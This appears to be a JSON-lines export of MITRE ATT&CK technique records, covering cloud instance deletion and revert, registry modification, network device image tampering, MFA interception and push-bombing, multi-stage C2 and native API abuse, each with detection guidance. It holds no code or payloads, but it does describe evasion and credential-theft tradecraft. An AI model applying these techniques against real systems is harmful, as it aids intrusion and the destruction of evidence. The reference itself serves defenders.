{"ID":"T1578.003","name":"Modify Cloud Compute Infrastructure: Delete Cloud Instance","description":"An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\n\nAn adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)","url":"https://attack.mitre.org/techniques/T1578/003","created":"16 June 2020","last modified":"08 March 2021","version":"1.1","tactics":"Defense Evasion","detection":"The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.\n\nIn AWS, CloudTrail logs capture the deletion of an instance in the <code>TerminateInstances</code> event, and in Azure the deletion of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances delete</code> to delete a VM.(Citation: Cloud Audit Logs)","platforms":"IaaS","data sources":"Instance: Instance Deletion, Instance: Instance Metadata","is sub-technique":true,"sub-technique of":"T1578","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Mandiant M-Trends 2020)"}
{"ID":"T1578.004","name":"Modify Cloud Compute Infrastructure: Revert Cloud Instance","description":"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)","url":"https://attack.mitre.org/techniques/T1578/004","created":"16 June 2020","last modified":"08 March 2021","version":"1.1","tactics":"Defense Evasion","detection":"Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.","platforms":"IaaS","data sources":"Instance: Instance Metadata, Instance: Instance Modification, Instance: Instance Start, Instance: Instance Stop","is sub-technique":true,"sub-technique of":"T1578","defenses bypassed":null,"contributors":"Netskope","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1112","name":"Modify Registry","description":"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.","url":"https://attack.mitre.org/techniques/T1112","created":"31 May 2017","last modified":"21 April 2023","version":"1.3","tactics":"Defense Evasion","detection":"Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).","platforms":"Windows","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Host forensic analysis","contributors":"Bartosz Jerzman; David Lu, Tripwire; Travis Smith, Tripwire","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: BlackBerry Amadey 2020),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Secureworks REvil September 2019),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Group IB Silence Sept 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Trend Micro Conficker),(Citation: FoxIT Wocao December 2019),(Citation: Trend Micro Black Basta May 2022),(Citation: ProofPoint Ursnif Aug 2016),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: Riskiq Remcos Jan 2018),(Citation: Korean FSI TA505 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Trustwave Pillowmint June 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: CME Github September 2018),(Citation: Symantec Catchamas April 2018),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Fidelis njRAT June 2013),(Citation: US-CERT BADCALL),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Symantec Nerex May 2012),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Tarrask scheduled task),(Citation: McAfee Night Dragon),(Citation: US-CERT Bankshot Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: KISA Operation Muzabi),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: ESET Casbaneiro Oct 2019),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Profero APT27 December 2020),(Citation: ESET Gamaredon June 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Talos Bisonal Mar 2020),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: RedCanary Mockingbird May 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: ESET PipeMon May 2020),(Citation: Cybereason Valak May 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Rancor Unit42 June 2018),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: CISA AA20-301A Kimsuky),(Citation: CERT-EE Gamaredon January 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye APT30),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Kaspersky Regin),(Citation: CERT-FR PYSA April 2020),(Citation: Unit 42 Inception November 2018),(Citation: CIRCL PlugX March 2013),(Citation: SentinelOne Valak June 2020),(Citation: Minerva Labs Black Basta May 2022),(Citation: Red Canary NETWIRE January 2020),(Citation: Palo Alto Rover),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Arxiv Avaddon Feb 2021),(Citation: Kaspersky TajMahal April 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: Talos TinyTurla September 2021),(Citation: FireEye APT28),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Nccgroup Emissary Panda May 2018),(Citation: ESET Dukes October 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: TrendMicro Netwalker May 2020),(Citation: Unit 42 Valak July 2020),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Intel 471 REvil March 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Symantec Volgmer Aug 2014),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: ESET TeleBots Oct 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: FireEye Shamoon Nov 2016),(Citation: ESET LoJax Sept 2018),(Citation: Cybereason Chaes Nov 2020),(Citation: Symantec Naid June 2012),(Citation: Symantec Darkmoon Aug 2005),(Citation: Prevailion EvilNum May 2020),(Citation: FireEye APT41 Aug 2019),(Citation: Trend Micro Waterbear December 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: AADInternals Documentation),(Citation: Deep Instinct Black Basta August 2022),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: Check Point Warzone Feb 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Talos ZxShell Oct 2014),(Citation: ESET Attor Oct 2019),(Citation: Cylance Sodinokibi July 2019),(Citation: McAfee Shamoon December 2018),(Citation: FireEye FELIXROOT July 2018),(Citation: IBM MegaCortex),(Citation: GDATA Zeus Panda June 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: CISA ComRAT Oct 2020),(Citation: NCC Group Black Basta June 2022),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Red Canary Qbot),(Citation: Cylance Shell Crew Feb 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cyble Black Basta May 2022),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Sodinokibi October 2019),(Citation: Medium Metamorfo Apr 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Microsoft NICKEL December 2021),(Citation: NCC Group WastedLocker June 2020),(Citation: ESET InvisiMole June 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: US-CERT TA18-074A),(Citation: Symantec Waterbug Jun 2019),(Citation: FireEye APT32 May 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Microsoft Reg),(Citation: Medium KONNI Jan 2020),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Microsoft BlackCat Jun 2022),(Citation: Gh0stRAT ATT March 2019),(Citation: Talos Lokibot Jan 2021),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Group IB Ransomware September 2020),(Citation: ESET ComRAT May 2020),(Citation: ESET RTM Feb 2017),(Citation: GitHub QuasarRAT),(Citation: Cybereason Clop Dec 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Accenture HyperStack October 2020),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Fortinet Metamorfo Feb 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: FireEye APT38 Oct 2018),(Citation: Talos PoetRAT April 2020),(Citation: Trend Micro njRAT 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: SANS Conficker),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1601","name":"Modify System Image","description":"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.","url":"https://attack.mitre.org/techniques/T1601","created":"19 October 2020","last modified":"22 October 2020","version":"1.0","tactics":"Defense Evasion","detection":"Most embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because this method may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. \n\nCompare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.  (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)\n\nMany vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)","platforms":"Network","data sources":"File: File Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management)"}
{"ID":"T1601.002","name":"Modify System Image: Downgrade System Image","description":"Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)\n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  ","url":"https://attack.mitre.org/techniques/T1601/002","created":"19 October 2020","last modified":"22 October 2020","version":"1.0","tactics":"Defense Evasion","detection":"Many embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because image downgrade may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. ","platforms":"Network","data sources":"File: File Modification","is sub-technique":true,"sub-technique of":"T1601","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management)"}
{"ID":"T1601.001","name":"Modify System Image: Patch System Image","description":"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence. ","url":"https://attack.mitre.org/techniques/T1601/001","created":"19 October 2020","last modified":"22 October 2020","version":"1.0","tactics":"Defense Evasion","detection":"Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)\n\nMany vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)","platforms":"Network","data sources":"File: File Modification","is sub-technique":true,"sub-technique of":"T1601","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cisco Synful Knock Evolution),(Citation: Mandiant - Synful Knock),(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management)"}
{"ID":"T1111","name":"Multi-Factor Authentication Interception","description":"Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones.(Citation: Okta Scatter Swine 2022)","url":"https://attack.mitre.org/techniques/T1111","created":"31 May 2017","last modified":"14 April 2023","version":"2.1","tactics":"Credential Access","detection":"Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.\n\nSimilar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.","platforms":"Linux, Windows, macOS","data sources":"Driver: Driver Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"John Lambert, Microsoft Threat Intelligence Center","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Alienvault Sykipot DOD Smart Cards),(Citation: NCC Group Chimera January 2021),(Citation: KISA Operation Muzabi),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1621","name":"Multi-Factor Authentication Request Generation","description":"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\n\nAdversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.\n\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)","url":"https://attack.mitre.org/techniques/T1621","created":"01 April 2022","last modified":"04 April 2023","version":"1.0","tactics":"Credential Access","detection":"Monitor user account logs as well as 2FA/MFA application logs for suspicious events: unusual login attempt source location, mismatch in location of login attempt and smart device receiving 2FA/MFA request prompts, and high volume of repeated login attempts, all of which may indicate user's primary credentials have been compromised minus 2FA/MFA mechanism. ","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Jon Sternstein, Stern Security; Pawel Partyka, Microsoft 365 Defender; Shanief Webb","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: MFA Fatigue Attacks - PortSwigger),(Citation: Microsoft Common Conditional Access Policies)"}
{"ID":"T1104","name":"Multi-Stage Channels","description":"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.","url":"https://attack.mitre.org/techniques/T1104","created":"31 May 2017","last modified":"14 July 2020","version":"1.0","tactics":"Command and Control","detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talos MuddyWater May 2019),(Citation: Chaos Stolen Backdoor),(Citation: Cybereason Bazar July 2020),(Citation: FireEye Operation Double Tap),(Citation: Lazarus APT January 2022),(Citation: Zscaler Bazar September 2020),(Citation: FireEye APT30),(Citation: Unit 42 Valak July 2020),(Citation: FireEye APT17),(Citation: FireEye APT41 March 2020),"}
{"ID":"T1106","name":"Native API","description":"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).","url":"https://attack.mitre.org/techniques/T1106","created":"31 May 2017","last modified":"19 April 2022","version":"2.1","tactics":"Execution","detection":"Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. ","platforms":"Linux, Windows, macOS","data sources":"Module: Module Load, Process: OS API Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Gordon Long, Box, Inc., @ethicalhax; Stefan Kanthak","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: XAgentOSX 2017),(Citation: BlackBerry Amadey 2020),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Trusteer Carberp October 2010),(Citation: Secureworks REvil September 2019),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Group IB Silence Sept 2018),(Citation: FoxIT Wocao December 2019),(Citation: McAfee Lazarus Nov 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Korean FSI TA505 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Trustwave Pillowmint June 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: S2 Grupo TrickBot June 2017),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: wardle evilquest partii),(Citation: NCSC Cyclops Blink February 2022),(Citation: McAfee Lazarus Jul 2020),(Citation: Github PowerShell Empire),(Citation: Checkpoint IndigoZebra July 2021),(Citation: SecureList Silence Nov 2017),(Citation: Juniper IcedID June 2020),(Citation: Lunghi Iron 